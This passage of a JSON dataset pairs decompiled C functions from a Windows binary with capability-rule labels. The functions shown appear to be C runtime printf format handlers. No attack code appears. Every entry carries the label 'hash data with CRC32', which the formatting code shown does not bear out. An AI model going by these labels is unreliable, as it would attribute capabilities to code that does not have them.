*(in_ECX + 8));\n            if ((iVar10 != 0) || (var_10h == 0)) {\n                *arg_10h = -1;\n                break;\n            }\n            fcn.00455870(&fcn.0044dc08::var_ch, var_10h, arg_10h, *(in_ECX + 8));\n            var_14h = var_14h + 1;\n        } while (var_14h != *(in_ECX + 0x34));\n    }\n    if (((-1 < *arg_10h) && ((*(in_ECX + 0x1c) >> 2 & 1) != 0)) && (uVar11 = *(in_ECX + 8),  0 < var_1ch)) {\n        while (cVar6 = fcn.00454f59(0x20, uVar11),  cVar6 != '\\0') {\n            iVar10 = *arg_10h;\n            *arg_10h = iVar10 + 1;\n            if ((iVar10 == -2) || (iVar9 = iVar9 + 1,  var_1ch <= iVar9)) goto code_r0x0044df3c;\n        }\n        *arg_10h = -1;\n    }\ncode_r0x0044df3c:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2604
    },
    "0044df4a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0044df4a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_10h;\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    bool bVar5;\n    bool bVar6;\n    char cVar7;\n    uchar uVar8;\n    int32_t in_ECX;\n    int32_t *piVar9;\n    int32_t iVar10;\n    uint16_t *puVar11;\n    int32_t iVar12;\n    uint unaff_EBX;\n    int32_t iVar13;\n    uint arg_8h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uchar var_ch [8];\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    cVar7 = *(in_ECX + 0x2d);\n    if (cVar7 < 'e') {\n        if (cVar7 == 'd') {\ncode_r0x0044dff5:\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) | 0x10;\ncode_r0x0044dff9:\n            cVar7 = fcn.00442257(0);\n        }\n        else if (cVar7 < 'T') {\n            if (cVar7 == 'S') {\ncode_r0x0044e01e:\n                cVar7 = fcn.00452f8e();\n            }\n            else {\n                if (cVar7 != 'A') {\n                    if (cVar7 == 'C') {\ncode_r0x0044dfb7:\n                        cVar7 = fcn.00451e3d(0);\n                        goto code_r0x0044e02a;\n                    }\n                    if (((cVar7 != 'E') && (cVar7 != 'F')) && (cVar7 != 'G')) goto code_r0x0044e29a;\n                }\ncode_r0x0044df9b:\n                cVar7 = fcn.00450d00();\n            }\n        }\n        else if (cVar7 == 'X') {\n            arg_8h = 1;\ncode_r0x0044dfc8:\n            cVar7 = fcn.0044354b(arg_8h);\n        }\n        else {\n            if (cVar7 != 'Z') {\n                if (cVar7 != 'a') {\n                    if (cVar7 != 'c') goto code_r0x0044e29a;\n                    goto code_r0x0044dfb7;\n                }\n                goto code_r0x0044df9b;\n            }\n            cVar7 = fcn.00450470();\n        }\n    }\n    else if (cVar7 < 'p') {\n        if (cVar7 == 'o') {\n            cVar7 = fcn.00452c1f();\n        }\n        else {\n            if (((cVar7 == 'e') || (cVar7 == 'f')) || (cVar7 == 'g')) goto code_r0x0044df9b;\n            if (cVar7 == 'i') goto code_r0x0044dff5;\n            if (cVar7 != 'n') goto code_r0x0044e29a;\n            cVar7 = fcn.004526a3();\n        }\n    }\n    else {\n        if (cVar7 != 'p') {\n            if (cVar7 == 's') goto code_r0x0044e01e;\n            if (cVar7 != 'u') {\n                if (cVar7 != 'x') goto code_r0x0044e29a;\n                arg_8h = 0;\n                goto code_r0x0044dfc8;\n            }\n            goto code_r0x0044dff9;\n        }\n        cVar7 = fcn.00452d66();\n    }\ncode_r0x0044e02a:\n    if ((cVar7 == '\\0') || (*(in_ECX + 0x2c) != '\\0')) goto code_r0x0044e29a;\n    piVar9 = NULL;\n    var_10h = (var_10h >> 0x10 & 0xff00) << 0x10;\n    var_14h = NULL;\n    if ((*(in_ECX + 0x1c) >> 4 & 1) != 0) {\n        var_10h._1_3_ = var_10h >> 8;\n        if ((*(in_ECX + 0x1c) >> 6 & 1) == 0) {\n            if ((*(in_ECX + 0x1c) & 1) == 0) {\n                if ((*(in_ECX + 0x1c) >> 1 & 1) != 0) {\n                    var_10h = CONCAT31(var_10h._1_3_, 0x20);\n                    piVar9 = 0x1;\n                    var_14h = 0x1;\n                }\n                goto code_r0x0044e089;\n            }\n            var_10h = CONCAT31(var_10h._1_3_, 0x2b);\n        }\n        else {\n            var_10h = CONCAT31(var_10h._1_3_, 0x2d);\n        }\n        var_14h = 0x1;\n        piVar9 = 0x1;\n    }\ncode_r0x0044e089:\n    cVar7 = *(in_ECX + 0x2d);\n    if (((cVar7 != 'x') && (cVar7 != 'X')) || (bVar5 = true,  (*(in_ECX + 0x1c) >> 5 & 1) == 0)) {\n        bVar5 = false;\n    }\n    if ((cVar7 == 'a') || (bVar6 = false,  cVar7 == 'A')) {\n        bVar6 = true;\n    }\n    if ((bVar5) || (bVar6)) {\n        *(&var_10h + piVar9) = 0x30;\n        if ((cVar7 == 'X') || (cVar7 == 'A')) {\n            uVar8 = 0x58;\n        }\n        else {\n            uVar8 = 0x78;\n        }\n        *(&var_10h + 1 + piVar9) = uVar8;\n        piVar9 = piVar9 + 2;\n        var_14h = piVar9;\n    }\n    iVar12 = (*(in_ECX + 0x20) - piVar9) - *(in_ECX + 0x34);\n    if (((*(in_ECX + 0x1c) & 0xc) == 0) && (0 < iVar12)) {\n        iVar13 = *(in_ECX + 0x14);\n        iVar10 = 0;\n        do {\n            iVar4 = *(in_ECX + 0x448);\n            if (*(iVar4 + 8) == *(iVar4 + 4)) {\n                if (*(iVar4 + 0xc) == '\\0') {\n                    iVar13 = -1;\n                }\n                else {\n                    iVar13 = iVar13 + 1;\n                }\n                *(in_ECX + 0x14) = iVar13;\n            }\n            else {\n                *(in_ECX + 0x14) = iVar13 + 1;\n                *(iVar4 + 8) = *(iVar4 + 8) + 1;\n                ***(in_ECX + 0x448) = 0x20;\n                **(in_ECX + 0x448) = **(in_ECX + 0x448) + 1;\n            }\n            iVar13 = *(in_ECX + 0x14);\n            piVar9 = var_14h;\n        } while ((iVar13 != -1) && (iVar10 = iVar10 + 1,  iVar10 < iVar12));\n    }\n    arg_10h = in_ECX + 0x14;\n    ppiVar1 = in_ECX + 0x448;\n    fcn.004558c8(&var_10h, piVar9, arg_10h);\n    ppiVar2 = in_ECX + 0x448;\n    if (((*(in_ECX + 0x1c) >> 3 & 1) != 0) && (((*(in_ECX + 0x1c) >> 2 & 1) == 0 && (var_10h = 0,  0 < iVar12)))) {\n        do {\n            var_14h = *ppiVar2;\n            if (var_14h[2] == var_14h[1]) {\n                if (*(var_14h + 3) == '\\0') {\n                    iVar13 = -1;\n                }\n                else {\n                    iVar13 = *arg_10h + 1;\n                }\n                *arg_10h = iVar13;\n            }\n            else {\n                *arg_10h = *arg_10h + 1;\n                var_14h[2] = var_14h[2] + 1;\n                ***ppiVar2 = 0x30;\n                **ppiVar2 = **ppiVar2 + 1;\n            }\n        } while ((*arg_10h != -1) && (var_10h = var_10h + 1,  var_10h < iVar12));\n    }\n    iVar13 = 0;\n    if ((*(in_ECX + 0x38) == '\\0') || (*(in_ECX + 0x34) < 1)) {\n        fcn.004558c8(*(in_ECX + 0x30), *(in_ECX + 0x34), arg_10h);\n    }\n    else {\n        puVar11 = *(in_ECX + 0x30);\n        var_10h = 0;\n        do {\n            uVar3 = *puVar11;\n            puVar11 = puVar11 + 1;\n            var_14h = NULL;\n            iVar10 = fcn.0045eb63(&var_14h, var_ch, 6, uVar3, *(in_ECX + 8));\n            if ((iVar10 != 0) || (var_14h == NULL)) {\n                *arg_10h = -1;\n                break;\n            }\n            fcn.004558c8(var_ch, var_14h, arg_10h);\n            var_10h = var_10h + 1;\n        } while (var_10h != *(in_ECX + 0x34));\n    }\n    iVar10 = *arg_10h;\n    if (((-1 < iVar10) && ((*(in_ECX + 0x1c) >> 2 & 1) != 0)) && (0 < iVar12)) {\n        do {\n            piVar9 = *ppiVar1;\n            if (piVar9[2] == piVar9[1]) {\n                if (*(piVar9 + 3) == '\\0') {\n                    iVar10 = -1;\n                }\n                else {\n                    iVar10 = iVar10 + 1;\n                }\n                *arg_10h = iVar10;\n            }\n            else {\n                *arg_10h = iVar10 + 1;\n                piVar9[2] = piVar9[2] + 1;\n                ***ppiVar1 = 0x20;\n                **ppiVar1 = **ppiVar1 + 1;\n            }\n            iVar10 = *arg_10h;\n        } while ((iVar10 != -1) && (iVar13 = iVar13 + 1,  iVar13 < iVar12));\n    }\ncode_r0x0044e29a:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2716
    },
    "0044e2a9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0044e2a9(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_10h;\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    bool bVar5;\n    bool bVar6;\n    char cVar7;\n    uchar uVar8;\n    int32_t in_ECX;\n    int32_t *piVar9;\n    int32_t iVar10;\n    uint16_t *puVar11;\n    int32_t iVar12;\n    uint unaff_EBX;\n    int32_t iVar13;\n    uint arg_8h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uchar var_ch [8];\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    cVar7 = *(in_ECX + 0x2d);\n    if (cVar7 < 'e') {\n        if (cVar7 == 'd') {\ncode_r0x0044e354:\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) | 0x10;\ncode_r0x0044e358:\n            cVar7 = fcn.004423e4(0);\n        }\n        else if (cVar7 < 'T') {\n            if (cVar7 == 'S') {\ncode_r0x0044e37d:\n                cVar7 = fcn.00453000();\n            }\n            else {\n                if (cVar7 != 'A') {\n                    if (cVar7 == 'C') {\ncode_r0x0044e316:\n                        cVar7 = fcn.00451ed2(0);\n                        goto code_r0x0044e389;\n                    }\n                    if (((cVar7 != 'E') && (cVar7 != 'F')) && (cVar7 != 'G')) goto code_r0x0044e608;\n                }\ncode_r0x0044e2fa:\n                cVar7 = fcn.00450e91();\n            }\n        }\n        else if (cVar7 == 'X') {\n            arg_8h = 1;\ncode_r0x0044e327:\n            cVar7 = fcn.004436d8(arg_8h);\n        }\n        else {\n            if (cVar7 != 'Z') {\n                if (cVar7 != 'a') {\n                    if (cVar7 != 'c') goto code_r0x0044e608;\n                    goto code_r0x0044e316;\n                }\n                goto code_r0x0044e2fa;\n            }\n            cVar7 = fcn.004504d3();\n        }\n    }\n    else if (cVar7 < 'p') {\n        if (cVar7 == 'o') {\n            cVar7 = fcn.00452c3c();\n        }\n        else {\n            if (((cVar7 == 'e') || (cVar7 == 'f')) || (cVar7 == 'g')) goto code_r0x0044e2fa;\n            if (cVar7 == 'i') goto code_r0x0044e354;\n            if (cVar7 != 'n') goto code_r0x0044e608;\n            cVar7 = fcn.00452728();\n        }\n    }\n    else {\n        if (cVar7 != 'p') {\n            if (cVar7 == 's') goto code_r0x0044e37d;\n            if (cVar7 != 'u') {\n                if (cVar7 != 'x') goto code_r0x0044e608;\n                arg_8h = 0;\n                goto code_r0x0044e327;\n            }\n            goto code_r0x0044e358;\n        }\n        cVar7 = fcn.00452d7c();\n    }\ncode_r0x0044e389:\n    if (((cVar7 == '\\0') || (cVar7 = fcn.0044ad41(),  cVar7 != '\\0')) || (*(in_ECX + 0x2c) != '\\0'))\n    goto code_r0x0044e608;\n    piVar9 = NULL;\n    var_10h = (var_10h >> 0x10 & 0xff00) << 0x10;\n    var_14h = NULL;\n    if ((*(in_ECX + 0x1c) >> 4 & 1) != 0) {\n        var_10h._1_3_ = var_10h >> 8;\n        if ((*(in_ECX + 0x1c) >> 6 & 1) == 0) {\n            if ((*(in_ECX + 0x1c) & 1) == 0) {\n                if ((*(in_ECX + 0x1c) >> 1 & 1) != 0) {\n                    var_10h = CONCAT31(var_10h._1_3_, 0x20);\n                    piVar9 = 0x1;\n                    var_14h = 0x1;\n                }\n                goto code_r0x0044e3f7;\n            }\n            var_10h = CONCAT31(var_10h._1_3_, 0x2b);\n        }\n        else {\n            var_10h = CONCAT31(var_10h._1_3_, 0x2d);\n        }\n        var_14h = 0x1;\n        piVar9 = 0x1;\n    }\ncode_r0x0044e3f7:\n    cVar7 = *(in_ECX + 0x2d);\n    if (((cVar7 != 'x') && (cVar7 != 'X')) || (bVar5 = true,  (*(in_ECX + 0x1c) >> 5 & 1) == 0)) {\n        bVar5 = false;\n    }\n    if ((cVar7 == 'a') || (bVar6 = false,  cVar7 == 'A')) {\n        bVar6 = true;\n    }\n    if ((bVar5) || (bVar6)) {\n        *(&var_10h + piVar9) = 0x30;\n        if ((cVar7 == 'X') || (cVar7 == 'A')) {\n            uVar8 = 0x58;\n        }\n        else {\n            uVar8 = 0x78;\n        }\n        *(&var_10h + 1 + piVar9) = uVar8;\n        piVar9 = piVar9 + 2;\n        var_14h = piVar9;\n    }\n    iVar12 = (*(in_ECX + 0x20) - piVar9) - *(in_ECX + 0x34);\n    if (((*(in_ECX + 0x1c) & 0xc) == 0) && (0 < iVar12)) {\n        iVar13 = *(in_ECX + 0x14);\n        iVar10 = 0;\n        do {\n            iVar4 = *(in_ECX + 0x448);\n            if (*(iVar4 + 8) == *(iVar4 + 4)) {\n                if (*(iVar4 + 0xc) == '\\0') {\n                    iVar13 = -1;\n                }\n                else {\n                    iVar13 = iVar13 + 1;\n                }\n                *(in_ECX + 0x14) = iVar13;\n            }\n            else {\n                *(in_ECX + 0x14) = iVar13 + 1;\n                *(iVar4 + 8) = *(iVar4 + 8) + 1;\n                ***(in_ECX + 0x448) = 0x20;\n                **(in_ECX + 0x448) = **(in_ECX + 0x448) + 1;\n            }\n            iVar13 = *(in_ECX + 0x14);\n            piVar9 = var_14h;\n        } while ((iVar13 != -1) && (iVar10 = iVar10 + 1,  iVar10 < iVar12));\n    }\n    arg_10h = in_ECX + 0x14;\n    ppiVar1 = in_ECX + 0x448;\n    fcn.004558c8(&var_10h, piVar9, arg_10h);\n    ppiVar2 = in_ECX + 0x448;\n    if (((*(in_ECX + 0x1c) >> 3 & 1) != 0) && (((*(in_ECX + 0x1c) >> 2 & 1) == 0 && (var_10h = 0,  0 < iVar12)))) {\n        do {\n            var_14h = *ppiVar2;\n            if (var_14h[2] == var_14h[1]) {\n                if (*(var_14h + 3) == '\\0') {\n                    iVar13 = -1;\n                }\n                else {\n                    iVar13 = *arg_10h + 1;\n                }\n                *arg_10h = iVar13;\n            }\n            else {\n                *arg_10h = *arg_10h + 1;\n                var_14h[2] = var_14h[2] + 1;\n                ***ppiVar2 = 0x30;\n                **ppiVar2 = **ppiVar2 + 1;\n            }\n        } while ((*arg_10h != -1) && (var_10h = var_10h + 1,  var_10h < iVar12));\n    }\n    iVar13 = 0;\n    if ((*(in_ECX + 0x38) == '\\0') || (*(in_ECX + 0x34) < 1)) {\n        fcn.004558c8(*(in_ECX + 0x30), *(in_ECX + 0x34), arg_10h);\n    }\n    else {\n        puVar11 = *(in_ECX + 0x30);\n        var_10h = 0;\n        do {\n            uVar3 = *puVar11;\n            puVar11 = puVar11 + 1;\n            var_14h = NULL;\n            iVar10 = fcn.0045eb63(&var_14h, var_ch, 6, uVar3, *(in_ECX + 8));\n            if ((iVar10 != 0) || (var_14h == NULL)) {\n                *arg_10h = -1;\n                break;\n            }\n            fcn.004558c8(var_ch, var_14h, arg_10h);\n            var_10h = var_10h + 1;\n        } while (var_10h != *(in_ECX + 0x34));\n    }\n    iVar10 = *arg_10h;\n    if (((-1 < iVar10) && ((*(in_ECX + 0x1c) >> 2 & 1) != 0)) && (0 < iVar12)) {\n        do {\n            piVar9 = *ppiVar1;\n            if (piVar9[2] == piVar9[1]) {\n                if (*(piVar9 + 3) == '\\0') {\n                    iVar10 = -1;\n                }\n                else {\n                    iVar10 = iVar10 + 1;\n                }\n                *arg_10h = iVar10;\n            }\n            else {\n                *arg_10h = iVar10 + 1;\n                piVar9[2] = piVar9[2] + 1;\n                ***ppiVar1 = 0x20;\n                **ppiVar1 = **ppiVar1 + 1;\n            }\n            iVar10 = *arg_10h;\n        } while ((iVar10 != -1) && (iVar13 = iVar13 + 1,  iVar13 < iVar12));\n    }\ncode_r0x0044e608:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2731
    },
    "0044e617": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0044e617(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_10h;\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    bool bVar5;\n    bool bVar6;\n    char cVar7;\n    uchar uVar8;\n    int32_t in_ECX;\n    int32_t *piVar9;\n    int32_t iVar10;\n    uint16_t *puVar11;\n    int32_t iVar12;\n    uint unaff_EBX;\n    int32_t iVar13;\n    uint arg_8h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uchar var_ch [8];\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    cVar7 = *(in_ECX + 0x2d);\n    if (cVar7 < 'e') {\n        if (cVar7 == 'd') {\ncode_r0x0044e6c2:\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) | 0x10;\ncode_r0x0044e6c6:\n            cVar7 = fcn.00442580(0);\n        }\n        else if (cVar7 < 'T') {\n            if (cVar7 == 'S') {\ncode_r0x0044e6eb:\n                cVar7 = fcn.0045307e();\n            }\n            else {\n                if (cVar7 != 'A') {\n                    if (cVar7 == 'C') {\ncode_r0x0044e684:\n                        cVar7 = fcn.00451f91(0);\n                        goto code_r0x0044e6f7;\n                    }\n                    if (((cVar7 != 'E') && (cVar7 != 'F')) && (cVar7 != 'G')) goto code_r0x0044e967;\n                }\ncode_r0x0044e668:\n                cVar7 = fcn.0045103f();\n            }\n        }\n        else if (cVar7 == 'X') {\n            arg_8h = 1;\ncode_r0x0044e695:\n            cVar7 = fcn.00443874(arg_8h);\n        }\n        else {\n            if (cVar7 != 'Z') {\n                if (cVar7 != 'a') {\n                    if (cVar7 != 'c') goto code_r0x0044e967;\n                    goto code_r0x0044e684;\n                }\n                goto code_r0x0044e668;\n            }\n            cVar7 = fcn.0045054d();\n        }\n    }\n    else if (cVar7 < 'p') {\n        if (cVar7 == 'o') {\n            cVar7 = fcn.00452c59();\n        }\n        else {\n            if (((cVar7 == 'e') || (cVar7 == 'f')) || (cVar7 == 'g')) goto code_r0x0044e668;\n            if (cVar7 == 'i') goto code_r0x0044e6c2;\n            if (cVar7 != 'n') goto code_r0x0044e967;\n            cVar7 = fcn.004527d5();\n        }\n    }\n    else {\n        if (cVar7 != 'p') {\n            if (cVar7 == 's') goto code_r0x0044e6eb;\n            if (cVar7 != 'u') {\n                if (cVar7 != 'x') goto code_r0x0044e967;\n                arg_8h = 0;\n                goto code_r0x0044e695;\n            }\n            goto code_r0x0044e6c6;\n        }\n        cVar7 = fcn.00452d92();\n    }\ncode_r0x0044e6f7:\n    if ((cVar7 == '\\0') || (*(in_ECX + 0x2c) != '\\0')) goto code_r0x0044e967;\n    piVar9 = NULL;\n    var_10h = (var_10h >> 0x10 & 0xff00) << 0x10;\n    var_14h = NULL;\n    if ((*(in_ECX + 0x1c) >> 4 & 1) != 0) {\n        var_10h._1_3_ = var_10h >> 8;\n        if ((*(in_ECX + 0x1c) >> 6 & 1) == 0) {\n            if ((*(in_ECX + 0x1c) & 1) == 0) {\n                if ((*(in_ECX + 0x1c) >> 1 & 1) != 0) {\n                    var_10h = CONCAT31(var_10h._1_3_, 0x20);\n                    piVar9 = 0x1;\n                    var_14h = 0x1;\n                }\n                goto code_r0x0044e756;\n            }\n            var_10h = CONCAT31(var_10h._1_3_, 0x2b);\n        }\n        else {\n            var_10h = CONCAT31(var_10h._1_3_, 0x2d);\n        }\n        var_14h = 0x1;\n        piVar9 = 0x1;\n    }\ncode_r0x0044e756:\n    cVar7 = *(in_ECX + 0x2d);\n    if (((cVar7 != 'x') && (cVar7 != 'X')) || (bVar5 = true,  (*(in_ECX + 0x1c) >> 5 & 1) == 0)) {\n        bVar5 = false;\n    }\n    if ((cVar7 == 'a') || (bVar6 = false,  cVar7 == 'A')) {\n        bVar6 = true;\n    }\n    if ((bVar5) || (bVar6)) {\n        *(&var_10h + piVar9) = 0x30;\n        if ((cVar7 == 'X') || (cVar7 == 'A')) {\n            uVar8 = 0x58;\n        }\n        else {\n            uVar8 = 0x78;\n        }\n        *(&var_10h + 1 + piVar9) = uVar8;\n        piVar9 = piVar9 + 2;\n        var_14h = piVar9;\n    }\n    iVar12 = (*(in_ECX + 0x20) - piVar9) - *(in_ECX + 0x34);\n    if (((*(in_ECX + 0x1c) & 0xc) == 0) && (0 < iVar12)) {\n        iVar13 = *(in_ECX + 0x14);\n        iVar10 = 0;\n        do {\n            iVar4 = *(in_ECX + 0x448);\n            if (*(iVar4 + 8) == *(iVar4 + 4)) {\n                if (*(iVar4 + 0xc) == '\\0') {\n                    iVar13 = -1;\n                }\n                else {\n                    iVar13 = iVar13 + 1;\n                }\n                *(in_ECX + 0x14) = iVar13;\n            }\n            else {\n                *(in_ECX + 0x14) = iVar13 + 1;\n                *(iVar4 + 8) = *(iVar4 + 8) + 1;\n                ***(in_ECX + 0x448) = 0x20;\n                **(in_ECX + 0x448) = **(in_ECX + 0x448) + 1;\n            }\n            iVar13 = *(in_ECX + 0x14);\n            piVar9 = var_14h;\n        } while ((iVar13 != -1) && (iVar10 = iVar10 + 1,  iVar10 < iVar12));\n    }\n    arg_10h = in_ECX + 0x14;\n    ppiVar1 = in_ECX + 0x448;\n    fcn.004558c8(&var_10h, piVar9, arg_10h);\n    ppiVar2 = in_ECX + 0x448;\n    if (((*(in_ECX + 0x1c) >> 3 & 1) != 0) && (((*(in_ECX + 0x1c) >> 2 & 1) == 0 && (var_10h = 0,  0 < iVar12)))) {\n        do {\n            var_14h = *ppiVar2;\n            if (var_14h[2] == var_14h[1]) {\n                if (*(var_14h + 3) == '\\0') {\n                    iVar13 = -1;\n                }\n                else {\n                    iVar13 = *arg_10h + 1;\n                }\n                *arg_10h = iVar13;\n            }\n            else {\n                *arg_10h = *arg_10h + 1;\n                var_14h[2] = var_14h[2] + 1;\n                ***ppiVar2 = 0x30;\n                **ppiVar2 = **ppiVar2 + 1;\n            }\n        } while ((*arg_10h != -1) && (var_10h = var_10h + 1,  var_10h < iVar12));\n    }\n    iVar13 = 0;\n    if ((*(in_ECX + 0x38) == '\\0') || (*(in_ECX + 0x34) < 1)) {\n        fcn.004558c8(*(in_ECX + 0x30), *(in_ECX + 0x34), arg_10h);\n    }\n    else {\n        puVar11 = *(in_ECX + 0x30);\n        var_10h = 0;\n        do {\n            uVar3 = *puVar11;\n            puVar11 = puVar11 + 1;\n            var_14h = NULL;\n            iVar10 = fcn.0045eb63(&var_14h, var_ch, 6, uVar3, *(in_ECX + 8));\n            if ((iVar10 != 0) || (var_14h == NULL)) {\n                *arg_10h = -1;\n                break;\n            }\n            fcn.004558c8(var_ch, var_14h, arg_10h);\n            var_10h = var_10h + 1;\n        } while (var_10h != *(in_ECX + 0x34));\n    }\n    iVar10 = *arg_10h;\n    if (((-1 < iVar10) && ((*(in_ECX + 0x1c) >> 2 & 1) != 0)) && (0 < iVar12)) {\n        do {\n            piVar9 = *ppiVar1;\n            if (piVar9[2] == piVar9[1]) {\n                if (*(piVar9 + 3) == '\\0') {\n                    iVar10 = -1;\n                }\n                else {\n                    iVar10 = iVar10 + 1;\n                }\n                *arg_10h = iVar10;\n            }\n            else {\n                *arg_10h = iVar10 + 1;\n                piVar9[2] = piVar9[2] + 1;\n                ***ppiVar1 = 0x20;\n                **ppiVar1 = **ppiVar1 + 1;\n            }\n            iVar10 = *arg_10h;\n        } while ((iVar10 != -1) && (iVar13 = iVar13 + 1,  iVar13 < iVar12));\n    }\ncode_r0x0044e967:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2709
    },
    "0044e976": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044e976(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint unaff_EBX;\n    int32_t iVar6;\n    ushort uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint16_t uVar10;\n    uint uVar11;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_10h = 0x41;\n    iVar6 = 0;\n    uVar10 = *(param_1 + 0x2e);\n    var_18h = param_1;\n    if (uVar10 < 0x65) {\n        if (uVar10 == 100) {\ncode_r0x0044ea39:\n            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x10;\ncode_r0x0044ea3d:\n            cVar4 = fcn.0044270d(0);\n        }\n        else if (uVar10 < 0x54) {\n            if (uVar10 == 0x53) {\ncode_r0x0044ea66:\n                cVar4 = fcn.004530f0();\n            }\n            else {\n                if (uVar10 != 0x41) {\n                    if (uVar10 == 0x43) {\ncode_r0x0044e9f3:\n                        cVar4 = fcn.00452026(0);\n                        goto code_r0x0044ea76;\n                    }\n                    if (((uVar10 != 0x45) && (uVar10 != 0x46)) && (uVar10 != 0x47)) goto code_r0x0044ecc5;\n                }\ncode_r0x0044e9d2:\n                cVar4 = fcn.004511d0();\n            }\n        }\n        else if (uVar10 == 0x58) {\n            uVar11 = 1;\ncode_r0x0044ea08:\n            cVar4 = fcn.00443a01(uVar11);\n        }\n        else {\n            if (uVar10 != 0x5a) {\n                if (uVar10 != 0x61) {\n                    if (uVar10 != 99) goto code_r0x0044ecc5;\n                    goto code_r0x0044e9f3;\n                }\n                goto code_r0x0044e9d2;\n            }\n            cVar4 = fcn.004505b0();\n        }\n    }\n    else if (uVar10 < 0x70) {\n        if (uVar10 == 0x6f) {\n            cVar4 = fcn.00452c76();\n        }\n        else {\n            if (((uVar10 == 0x65) || (uVar10 == 0x66)) || (uVar10 == 0x67)) goto code_r0x0044e9d2;\n            if (uVar10 == 0x69) goto code_r0x0044ea39;\n            if (uVar10 != 0x6e) goto code_r0x0044ecc5;\n            cVar4 = fcn.0045285a();\n        }\n    }\n    else {\n        if (uVar10 != 0x70) {\n            if (uVar10 == 0x73) goto code_r0x0044ea66;\n            if (uVar10 != 0x75) {\n                if (uVar10 != 0x78) goto code_r0x0044ecc5;\n                uVar11 = 0;\n                goto code_r0x0044ea08;\n            }\n            goto code_r0x0044ea3d;\n        }\n        cVar4 = fcn.00452da8();\n    }\ncode_r0x0044ea76:\n    if ((cVar4 == '\\0') || (*(param_1 + 0x2c) != '\\0')) goto code_r0x0044ecc5;\n    var_ch = 0;\n    iVar5 = 0;\n    var_8h._0_2_ = 0;\n    var_14h = 0;\n    if ((*(param_1 + 0x1c) >> 4 & 1) != 0) {\n        if ((*(param_1 + 0x1c) >> 6 & 1) == 0) {\n            if ((*(param_1 + 0x1c) & 1) == 0) {\n                if ((*(param_1 + 0x1c) >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    iVar5 = 1;\n                    var_14h = 1;\n                }\n                goto code_r0x0044ead9;\n            }\n            uVar10 = 0x2b;\n        }\n        else {\n            uVar10 = 0x2d;\n        }\n        var_ch = uVar10;\n        var_14h = 1;\n        iVar5 = 1;\n    }\ncode_r0x0044ead9:\n    iVar2 = *(param_1 + 0x2e);\n    if (((iVar2 != 0x78) && (iVar2 != 0x58)) || (bVar9 = true,  (*(param_1 + 0x1c) >> 5 & 1) == 0)) {\n        bVar9 = false;\n    }\n    if ((iVar2 == 0x61) || (bVar3 = false,  iVar2 == var_10h)) {\n        bVar3 = true;\n    }\n    var_1ch = 0x30;\n    if ((bVar9) || (bVar3)) {\n        *(&var_ch + iVar5 * 2) = 0x30;\n        if ((iVar2 == 0x58) || (uVar7 = 0x78,  iVar2 == var_10h)) {\n            uVar7 = 0x58;\n        }\n        *(&var_ch + iVar5 * 2 + 2) = uVar7;\n        iVar5 = iVar5 + 2;\n        var_14h = iVar5;\n    }\n    iVar8 = (*(param_1 + 0x20) - *(param_1 + 0x34)) - iVar5;\n    if ((*(param_1 + 0x1c) & 0xc) == 0) {\n        uVar11 = *(param_1 + 8);\n        piVar1 = param_1 + 0x14;\n        var_10h = piVar1;\n        if (0 < iVar8) {\n            do {\n                fcn.00454eb0(0x20, 